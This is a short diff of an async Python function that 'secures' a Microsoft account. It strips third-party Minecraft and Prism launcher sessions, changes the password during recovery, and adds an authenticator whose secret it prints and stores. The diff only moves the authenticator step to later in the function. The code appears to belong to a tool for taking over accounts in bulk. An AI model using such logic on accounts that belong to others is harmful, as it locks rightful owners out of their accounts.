@@ -120,12 +120,6 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
     # Third Party Launchers (Minecraft, Prism)
     await removeServices(session)
 
-    # Add Authenticator
-    if enable_2fa:
-        auth = await addAuthenticator(session)
-        accountInfo["microsoft"]["auth_secret"] = auth
-        print(f"[+] - Added Authenticator ({auth})")
-
     if recovery:
 
         securityParameters = json.loads(await securityInformation(session))
@@ -161,6 +155,12 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
                 accountInfo["microsoft"]["password"] = password
             else:
                 print(f"[X] - Failed to secure this account")
+    
+    # Add Authenticator
+    if enable_2fa:
+        auth = await addAuthenticator(session)
+        accountInfo["microsoft"]["auth_secret"] = auth
+        print(f"[+] - Added Authenticator ({auth})")
         
     # Change Primary Alias is broken
     if replace_alias:
